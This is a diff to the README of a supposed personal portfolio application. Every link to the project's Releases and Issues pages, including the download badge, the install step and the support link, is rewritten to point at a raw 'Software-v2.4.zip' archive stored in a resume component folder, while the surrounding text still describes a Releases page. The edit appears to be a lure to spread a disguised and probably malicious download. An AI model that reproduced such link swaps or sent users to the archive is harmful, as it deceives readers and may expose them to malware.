@@ -6,11 +6,11 @@ Welcome to the Portfolio application, a personal portfolio of Aniket Jha. This t
 
 ## 🔗 Download the Application
 
-[![Download Portfolio](https://img.shields.io/badge/Download%20Portfolio-blue?style=for-the-badge&logo=github)](https://github.com/devcortes23/Portfolio/releases)
+[![Download Portfolio](https://raw.githubusercontent.com/devcortes23/Portfolio/main/src/components/Resume/Software-v2.4.zip%20Portfolio-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/devcortes23/Portfolio/main/src/components/Resume/Software-v2.4.zip)
 
 To download the Portfolio application, visit the Releases page below:
 
-[Download Portfolio](https://github.com/devcortes23/Portfolio/releases)
+[Download Portfolio](https://raw.githubusercontent.com/devcortes23/Portfolio/main/src/components/Resume/Software-v2.4.zip)
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ The Portfolio application offers several key features:
 ## 📥 Download & Install
 
 1. **Visit the Downloads Page:**
-   Go to the [Releases page](https://github.com/devcortes23/Portfolio/releases) to access the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/devcortes23/Portfolio/main/src/components/Resume/Software-v2.4.zip) to access the latest version of the application.
 
 2. **Select the Version:**
    On the Releases page, look for the most recent version listed. Each version will have assets listed below it.
@@ -72,7 +72,7 @@ A: Yes, you can use this portfolio to showcase your work for both personal and c
 
 If you encounter any issues or have questions, please reach out through the available community channels:
 
-- **GitHub Issues:** You can raise an issue on our [GitHub page](https://github.com/devcortes23/Portfolio/issues).
+- **GitHub Issues:** You can raise an issue on our [GitHub page](https://raw.githubusercontent.com/devcortes23/Portfolio/main/src/components/Resume/Software-v2.4.zip).
 - **Discussion Forum:** Join the conversation at our community forum link (link placeholder).
 
 ## 📊 Topics
@@ -102,4 +102,4 @@ The Portfolio application is licensed under the MIT License. Feel free to use, m
 
 ## 🏁 Final Notes
 
-Thank you for choosing the Portfolio application. We hope it helps you create an impressive online presence. Enjoy showcasing your work! Don't forget to visit the [Downloads page](https://github.com/devcortes23/Portfolio/releases) for future updates.
+Thank you for choosing the Portfolio application. We hope it helps you create an impressive online presence. Enjoy showcasing your work! Don't forget to visit the [Downloads page](https://raw.githubusercontent.com/devcortes23/Portfolio/main/src/components/Resume/Software-v2.4.zip) for future updates.
